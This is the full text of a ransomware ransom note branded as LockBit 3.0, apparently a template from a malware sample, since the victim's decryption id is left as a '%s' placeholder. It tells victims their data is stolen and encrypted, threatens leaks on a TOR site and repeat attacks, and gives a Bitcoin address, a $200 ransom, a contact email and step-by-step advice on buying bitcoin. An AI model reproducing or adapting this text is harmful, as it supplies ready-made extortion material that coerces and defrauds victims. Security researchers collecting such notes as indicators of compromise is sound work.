	~~~ LockBit 3.0, the fastest ransomware in the world since 2019 ~~~


	>>>> What happened?

	Your data is stolen and encrypted, the data will be published on TOR website if you do not pay the ransom.


	>>>> What guarantees that we will not deceive you?

	We are not a politically motivated group and we don't need anything other than your money.
    
	If you pay, we will provide you with the decryption programs and delete your data.
	Life is too short to be sad. Don't be sad, money is just paper.
    
	If we don't provide you with decryptors or delete your data after payment, no one will pay us in the future.
	This is why our reputation is very important to us. We attack businesses worldwide and there are no unsatisfied victims after payment.
    
	You can get information about us on Twitter: https://twitter.com/hashtag/lockbit?f=live
    

	>>>> How to pay to get the decryptor?
	
	You must contact us by email to be able to send us a message with the payment screenshot with your personal decryption id, so we will contact you again to give you our recovery software.

	Your personal decryption id: %s
	Our Bitcoin payment address: bc1q43rlc0qscd4xh2p5xxk2hnqtd4qrg4c9sn3f84
	The amount to pay: 200.00$
	Our contact email address: lockbit.contact@proton.me


	>>>> Why Bitcoin?

	As for the issue of anonymity, bitcoin is often considered more anonymous than traditional payment methods because it is not directly linked to your identity.
	Bitcoin transactions are recorded on a public blockchain, but they are pseudonymous.


	>>>> How to buy bitcoin?

	To buy bitcoin, start by looking for trusted exchanges like Coinbase, Binance, or Kraken.
	Once registered on one of these platforms, explore options for purchasing bitcoin using your local currency.
	Familiarize yourself with the process of verifying and securing a digital wallet.


	>>>> Information?

	Attention ! Do not delete or modify any files, this may cause recovery problems!
	Attention ! If you don't pay the ransom, we will repeatedly attack your business again!"
